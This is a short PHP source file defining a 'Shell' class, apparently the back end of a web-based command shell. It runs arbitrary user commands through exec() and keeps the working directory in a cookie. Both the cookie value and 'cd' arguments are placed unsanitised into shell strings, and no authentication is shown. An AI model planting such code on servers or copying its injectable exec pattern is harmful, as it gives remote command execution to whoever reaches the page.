<?php
class Shell {
	private static $cmd;
	private static $dir = '';
	
	public static function parse($command) {
		self::init();
		$cmd = trim($command);
		if (strpos($cmd, 'cd ') === 0) {
			$cd = trim(substr($cmd, 3));
			$cd = (strpos($cd, '/') === 0 || $cd === '~') ? $cd : (rtrim(self::$dir,'/').'/'.$cd);
			$dir = exec("cd $cd; pwd");
			self::setCwd($dir);
			self::$cmd = "cd $cd";
		} else {
			self::$cmd = $cmd;
		}
	}
	
	public static function cwd() {
		if (self::$dir === '') self::init();
		return self::$dir;
	}

	public static function scwd() {
		return substr(self::$dir, strrpos(self::$dir, '/') + 1);
	}

	public static function exec() {
		$output = '';
		if (strpos(self::$cmd, 'cd ') !== 0) {
			$dir = self::$dir;
			$cmd = self::$cmd;
			$lines = array();
			exec("cd $dir; $cmd", $lines);
			foreach($lines as $line) {
				echo htmlspecialchars($line)."\n";
			}
		}
		return $output;
	}
	
	public static function cmd() {
		return self::$cmd;
	}

	private static function init() {
		if (isset($_COOKIE['shell_cdir'])) {
			self::$dir = $_COOKIE['shell_cdir'];
		} else {
			self::setCwd(getcwd());
		}
	}	
	
	private static function setCwd($dir) {
		self::$dir = $dir;
		setcookie('shell_cdir', self::$dir);
	}
}
?>